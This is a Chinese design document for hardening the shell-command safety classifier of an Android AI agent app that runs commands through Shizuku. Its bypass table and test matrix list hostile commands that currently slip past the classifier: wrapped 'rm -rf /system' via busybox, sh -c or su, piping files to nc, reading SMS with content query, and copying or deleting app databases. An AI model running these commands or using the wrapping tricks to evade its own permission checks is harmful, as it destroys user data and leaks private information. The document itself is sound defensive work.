# 设计方案：Shizuku 红线流程改造（递归分析 + 私人数据硬保护）

> 目标：让 Shizuku 权限下的安全判定真正「可判断」——危险命令在到达用户之前就被拦死，
> 而不是降级成普通确认框逼用户盲点「允许」；同时让只读查询类命令自动放行，减少弹窗摩擦。
> 本文只做设计，**不含已实施的代码改动**；标注为「需改动」的部分等确认后再动。

## 一、需求（用户原话）

> 「不用放行，但是又能保证我手机的安全，我的隐私，但是又希望他能力强，
> 应用的数据隐私可读不可写，我的私人数据比如照片不可读不可写」

拆成可执行的三条：

| # | 需求 | 可执行判据 |
| --- | --- | --- |
| R1 | 少弹窗、能力强 | 只读查询类命令（`getprop`/`pm list packages`/`dumpsys battery` 等）自动放行 |
| R2 | 照片等私人数据不可读不可写 | `/sdcard/{DCIM,Pictures,Download,Movies,Music,Documents}` 读写一律硬拦，`elevate` 也无效 |
| R3 | 安全与隐私 | 红线四类只增不减；判定不可被 AI 改写或记忆 |

## 二、现状（已核实）

### 2.1 调用链

```
StatefulAgentWorkflow.kt:892  requestPermissionIfNeeded(...)
 └ :1611  policyEngine.evaluate(tool, name, args, mode)
    ├ ToolPermissionPolicyEngine.kt:133  if (toolName == SHIZUKU_TOOL)      ← 红线闸门，带 return
    │  ├ ShizukuCommandClassifier.kt:83   classify(command)
    │  └ ToolPermissionPolicyEngine.kt:286 elevationOrDeny(...) → ASK 或 DENY
    ├ :147 PLAN → DENY
    ├ :151 AUTO 分支（Shizuku 见 :170-178）
    └ :200 evaluateShell(rules, args, forceAsk = toolName == SHIZUKU_TOOL)
       └ :408 if (forceAsk) → ASK（不可记忆）                              ← 常规路径
 ▼ 批准后
ShizukuTool.kt:93  execute() → ShizukuManager.kt:200 runCommand
 └ ShizukuShellService.kt:26  ProcessBuilder("sh","-c",command).start()
```

### 2.2 一个必须先纠正的判断

**红线闸门本身是正确的，不要改 `evaluate()` 的控制流。**

`ToolPermissionPolicyEngine.kt:133-144` 的红线闸门带 `return`，且位于任何 `mode ==` 判断**之前**
（全文 `mode ==` 仅两处：`:147` PLAN、`:151` AUTO，都在其后）。实测三态一致：

| classify() 结果 | AUTO | BUILD / PLAN |
| --- | --- | --- |
| `RED_LINE` | DENY（`:138`） | DENY（`:138`） |
| `SAFE` | ALLOW（`:175`） | ASK（`:409`） |
| `CONFIRM` | ASK（`:177`） | ASK（`:409`） |

即 `rm -rf /system` 在 BUILD/PLAN/AUTO **三态都 DENY，行为正确**。

**真正的问题是分类器漏判。** 红线闸门 `:137` 的条件是 `verdict == RED_LINE`；
实测的 10 类绕过命令分类器全部判 `CONFIRM`，条件不满足 → 不 return →
落到 `:408` 的普通 ASK。**所以修分类器，不要修引擎控制流。**

> 备注：早期内部结论曾误判为「非 AUTO 模式红线丢失」（漏读 `:138` 的 `return`），
> 经对抗性核查（sha256 逐字节比对 + 移植实跑）推翻并已修正，此处记录以免重复踩坑。

### 2.3 实测绕过清单（全部仅 CONFIRM，未命中 RED_LINE）

| 命令 | 危害 | 现状 |
| --- | --- | --- |
| `busybox rm -rf /system` | 删系统 | CONFIRM |
| `sh -c "rm -rf /system"` | 删系统 | CONFIRM |
| `su -c "rm -rf /system"` | 提权到 root | CONFIRM |
| `cmd package uninstall com.x` | 卸载应用 | CONFIRM |
| `cp /data/data/<pkg>/databases/x /sdcard/` | 窃取应用数据 | CONFIRM |
| `tar czf /sdcard/l.tgz /data/data/<pkg>/databases` | 打包窃取 | CONFIRM |
| `nc host 1234 < /sdcard/secret` | 数据外发 | CONFIRM |
| `cat /sdcard/x \| nc host 1234` | 数据外发 | CONFIRM |
| `content query --uri content://sms` | 读短信 | CONFIRM |
| `for p in /data/data/*; do rm -rf $p; done` | 批量删应用数据 | CONFIRM |

对照（这些**已正确拦截**，属回归用例，不得改坏）：
`pm uninstall --user 0 com.x`、`settings put global x 1`、`dd if=/dev/zero of=/sdcard/big`、
`rm -rf /sdcard/DCIM`、`rm -rf /data/data/<pkg>/databases`、
`cat /data/data/<pkg>/databases/x.db`、`/system/bin/rm -rf /system` → 均 RED_LINE。

### 2.4 根因

执行层是 `ShizukuShellService.kt:26` 的 `ProcessBuilder("sh","-c",command)`——
命令被 shell **二次解析**；而分类器只做首 token 前缀匹配
（`matches()` 为 token 前缀；`effectiveTokens()` 仅剥离环境变量赋值）。

两个具体表现：

- `sh -c "rm -rf /system"` 的 `analyzable` 仍为 `true`（引号内内容不触发不可判定），
  故连「不可静态判定 + 疑似破坏性」的兜底也未触发；
- `rm -rf $p` 逐段 tokenize 为 `["do","rm","-rf","$p"]`，
  `checkCatastrophicRm` 仅匹配字面路径，循环变量不匹配 `APP_DATA_ROOT`。

### 2.5 SAFE 档过宽

`SAFE_PROGRAMS`（`:30-34`，含 `dumpsys`/`du`/`ls`）+ 前缀 `settings list`/`logcat -d`
使以下命令在 AUTO 下走 `:175` 的 `Verdict.ALLOW`，**静默执行、无弹窗**：

`dumpsys meminfo <pkg>`、`dumpsys activity`、`dumpsys telephony.registry`、
`settings list secure`、`settings list global`、`logcat -d`、`logcat -d -b all`、
`du -sh /data`、`ls /data/data`、`ls /sdcard`、`cat /sdcard/Download/report.json`。

危害面：`dumpsys meminfo <pkg>` 泄露他应用内存概况；`dumpsys telephony.registry`
泄露通话/网络状态；`logcat -b all` 可含全系统日志；`du -sh /data` + `ls /data/data`
可枚举**已安装应用清单**（`ls` 未列入隐私目录检查，`PRIVACY_DIRS` 只含 `databases`/`shared_prefs`）。

**注意不对称性**：`SAFE` 判错的代价是**无提示执行**，高于 `CONFIRM` 判错。
`cat /data/data/<pkg>/databases/x` 已正确判 RED_LINE（`READPRIV`），
说明「读文件内容」受保护，但「目录列举与元数据查询」不受。

### 2.6 `elevate` 现状

- 读取点唯一：`ToolPermissionPolicyEngine.kt:250-251` `isElevationRequested()`；
- 降级点 `:286-300`：带 `elevate` → ASK（`askTitle="高危操作提权确认"`，
  `rememberablePatterns = emptyList()`）；不带 → DENY（拒因含可操作指引，`:298`）；
- **不是死锁**：`ShizukuTool.kt:56-69` 确实未声明 `elevate`，
  但 `ToolArgValidator.kt:28-29` 注释自陈「只校验必填项、**不拦多余参数**」，
  `ArgNormalizer` 对未声明键原样保留，引擎按名读取——路径可达；
- **真实缺陷**：未声明 → 未经 function-calling 结构化约束 → **模型只能靠散文描述猜**键名与类型。
  Bash（`ExecuteCommandTool.kt:74-79`）有结构化 BOOLEAN 声明，Shizuku 没有，同一机制两种可靠性；
- **零审计**：全仓无任何权限决策表（DAO 仅 `AgentMessageDao`/`ChatSessionDao`/`CheckpointDao`/
  `DurableTaskDao`/`LlmCallRecordDao`/`TodoItemDao`），提权/红线拒绝只进 `FileLogger`；
  `StatefulAgentWorkflow.kt` 中检索 `elevate` **零命中**——提权事实从未进任何日志。

### 2.7 平台限制（重要，避免写无效代码）

Shizuku 用 adb shell 身份（uid 2000）执行。**Android 11+ 分区存储下，
shell 读不到任何其他应用的 `/data/data`，也读不到 `/sdcard/Android/data/<其他包名>`**，
会返回 `Permission denied`。唯一途径是 root，本方案不采用。

**因此需求中的「应用数据可读」按平台限制放弃**，且放弃它不带来安全损失。
文档 `docs-site/docs/guide/shizuku.md:19` 称「shell 读不到其他应用私有数据目录」与此一致，
但该文档只按 adb 框架叙述、**遗漏了 root 授权这一分支**，而分类器按 root 能力设防
（把 `/data/data/*/databases` 读取列为 RED_LINE）——文档与实现的能力假设不一致。

## 三、方案

### 3.1 目标模型

把 Shizuku 命令分三档，判据是**用户能否自己判断风险**：

| 档位 | 语义 | 出口 |
| --- | --- | --- |
| `SAFE` | 只读、不改状态、**不读宿主任意文件** | AUTO 下自动放行，不弹窗 |
| `CONFIRM` | 会改状态，但可能是正常工作 | 弹窗一次（Shizuku 恒不可记忆） |
| `RED_LINE` | 确定红线 / 真实执行体不可静态确定 | **直接拦死**，仅 `elevate` 可单次提权 |

**核心设计原则：真实执行体不可静态确定时，不给 `CONFIRM`。**
因为用户看弹窗无法分辨 `ls` 与 `busybox rm -rf /system`——
把危险命令混进普通确认框，等于逼用户盲点「允许」。这是当前流程真正的病根。

### 3.2 三条铁律（不得违反）

1. **安全判定留在编译期常量里**（`ShizukuCommandClassifier.kt`）。
   不得落盘成 `PermissionRule`，不得做成可配置项。
   理由：`PermissionRulesRepository.kt:49-50` 自承项目级规则存在工作区内、**可被 AI 修改**——
   一旦落盘，AI 就能给自己扩权。
2. **Shizuku 规则永不落库。** 保留三重闸门：
   `ToolPermissionPolicyEngine.kt:408`、`:177`、`StatefulAgentWorkflow.kt:1645`
   的 `rememberablePatterns = emptyList()` 与落库守卫。
   不得为了「减少弹窗」而打开记忆能力。
3. **不得放宽红线。** 红线四类（删系统/他人数据、改系统或应用状态、外发数据、读他人隐私）只增不减。

### 3.3 改动清单

#### 改动 1：分类器改为递归分析（首要）

**文件**：`ShizukuCommandClassifier.kt`

1. **包装器递归**：首 token 为
   `sh`/`bash`/`busybox`/`env`/`nice`/`nohup`/`xargs`/`timeout`/`su`/`sudo` 时，
   剥掉包装，**递归分析其参数中的真实命令**。
   `sh -c "rm -rf /system"` 必须递归后命中 `rm` 红线。
2. **命令替换 / 反引号 / 子 shell**：`$(...)`、`` ` ``、`( )` 内部递归分析；
   **内层不可静态判定时判 `RED_LINE`，不是 `CONFIRM`**。
3. **管道含网络程序**：任一段是 `nc`/`ncat`/`socat`/`ssh`/`curl`/`wget`
   → 判 `RED_LINE`（外发数据）。
4. **删除目标含变量或 glob**：如 `rm -rf $p` / `rm -rf /data/data/*`
   → 判 `RED_LINE`（目标不可知）。
5. **`su`/`sudo` 一律 `RED_LINE`**。`RED_LINE_PREFIXES`（`:66-71`）现无此二项，
   而 `su` 是设备已 root 时提权到 root 的**最短路径**，管控却比 `pm uninstall` 更松。

#### 改动 2：补两张缺失的表

1. **`content` 纳入 `CONTENT_READERS`**（`:46`）。
   `content query --uri content://sms` 能读短信/联系人/通话记录，现仅 CONFIRM，
   且不受 `PRIVACY_DIRS` 保护。**这比 `dumpsys`/`logcat` 的数据面更敏感。**
2. **`RED_LINE_PREFIXES`（`:66-71`）补 `cmd package uninstall`**（现只列 `pm uninstall`）。

#### 改动 3：SAFE 档收紧

**文件**：`ShizukuCommandClassifier.kt` 的 `isSafeSegment()`（`:182-189`）

`SAFE` 必须**同时**满足三条（否则降为 `CONFIRM`）：

1. 程序在只读白名单内；
2. 参数不触碰隐私路径（保留现有检查）；
3. **不读取宿主任意文件**——`cat`/`head`/`tail`/`grep` 等 `CONTENT_READERS`
   读 `/sdcard` 或任意路径 → 降为 `CONFIRM`。

上述 §2.5 的 `dumpsys`/`settings list`/`logcat`/`du` 示例随之降为 `CONFIRM`。

#### 改动 4：私人数据目录硬保护（R2）

**新增编译期常量表**（不可配置、不可落盘）：

```
PRIVATE_MEDIA_DIRS = DCIM, Pictures, Download, Movies, Music, Documents
                     （/sdcard 下；/storage/emulated/0/ 同理）
```

**规则**：命中这些路径——**读和写都判 `RED_LINE`**，不得降级、
**不得被 `elevate` 绕过**。

**必改测试**：`ShizukuCommandClassifierTest.kt:40` 的 `safe_reportsJson`
断言 `cat /sdcard/Download/report.json` = `SAFE`，**与本条直接冲突，必须修改**
（该测试固化了「读 Download 放行」这一与新需求相反的行为）。

#### 改动 5：`elevate` 参数补齐

**文件**：`ShizukuTool.kt:56-69`

补上 `elevate`（BOOLEAN，`required = false`），与 Bash（`ExecuteCommandTool.kt:74-79`）对齐。

**限制**：`elevate` **不得**绕过改动 4 的私人数据红线——照片类路径无条件拒绝。

#### 改动 6：加审计

红线拒绝与提权放行都记录结构化日志：时间、会话 id、完整命令、命中哪一类、
是否提权、用户选了什么（`ONCE`/`REJECT`）。

### 3.4 不需要改的地方

`ToolPermissionPolicyEngine.kt` **原则上不需要改动**（见 §2.2）——
它已正确消费 `classify()` 的结果，改动集中在分类器判定能力本身。
若实施中发现确有必要改引擎，须在提交说明里写明理由。

## 四、测试矩阵

| 用例 | 期望 | 现状 |
| --- | --- | --- |
| `busybox rm -rf /system` | RED_LINE | CONFIRM |
| `sh -c "rm -rf /system"` | RED_LINE | CONFIRM |
| `su -c "rm -rf /system"` | RED_LINE | CONFIRM |
| `content query --uri content://sms` | RED_LINE | CONFIRM |
| `cmd package uninstall com.x` | RED_LINE | CONFIRM |
| `cp /data/data/<pkg>/databases/x /sdcard/` | RED_LINE | CONFIRM |
| `tar czf /sdcard/l.tgz /data/data/<pkg>/databases` | RED_LINE | CONFIRM |
| `nc h 1 < /sdcard/secret` | RED_LINE | CONFIRM |
| `cat /sdcard/x \| nc h 1` | RED_LINE | CONFIRM |
| `for p in /data/data/*; do rm -rf $p; done` | RED_LINE | CONFIRM |
| `cat /sdcard/DCIM/a.jpg`（读照片） | RED_LINE | — |
| `rm /sdcard/Pictures/a.png`（写照片） | RED_LINE | — |
| 照片路径 + `elevate: true` | RED_LINE（提权无效） | — |
| `dumpsys meminfo <pkg>` | CONFIRM | SAFE 静默放行 |
| `settings list secure` | CONFIRM | SAFE 静默放行 |
| `logcat -d -b all` | CONFIRM | SAFE 静默放行 |
| `cat /sdcard/Download/report.json` | RED_LINE | SAFE（须改测试） |
| `pm list packages`、`getprop`、`dumpsys battery` | SAFE | SAFE（保持） |
| `rm -rf /system`（BUILD/PLAN/AUTO） | DENY | DENY（**保持，已正确**） |

**回归重点**：最后两行。红线在三模式下的一致性**已经是正确的，不要改坏**；
SAFE 白名单的常规放行行为**保持不变**，避免把可用性改差。

## 五、验证方式（项目 CLAUDE.md 要求）

```bash
./gradlew :app:testUniversalDebugUnitTest
python3 scripts/check_migrations.py
./gradlew :app:assembleUniversalDebug
```

## 六、残余与未决

1. **Shizuku 授权形态（adb / root）未确认。** 本方案按 **adb shell 上限**设计（最严）。
   若设备是 root 授权，则 AI **确实能读到** `/data/data`，
   改动 1 的隐私红线才真正生效，需额外收紧——实施前应确认此点。
2. **`content query` 端到端未验证**：能否真读到 SMS 取决于设备 SELinux 与 provider 权限。
   代码路径与分类结论已实测，端到端未实测。
3. **「应用数据可读」需求按平台限制放弃**（见 §2.7）。
4. **本方案不含已实施代码**，实施者需自行编写并跑通 §5 的三条命令再提交。

## 七、证据基础

本方案全部结论来自 `main` 分支源码实读 + 探针实跑，非推测。所用方法与产物：

- 分类器与解析器的**忠实 JS 移植**，对仓库全部测试向量（`ShizukuCommandClassifierTest.kt`）
  实跑 **0 mismatch**，用于穷举绕过用例；
- 关键文件以 **sha256** 与 `main` 逐字节比对确认；
- 对抗性核查推翻了早期一项错误结论（见 §2.2 备注），修正过程已记录。
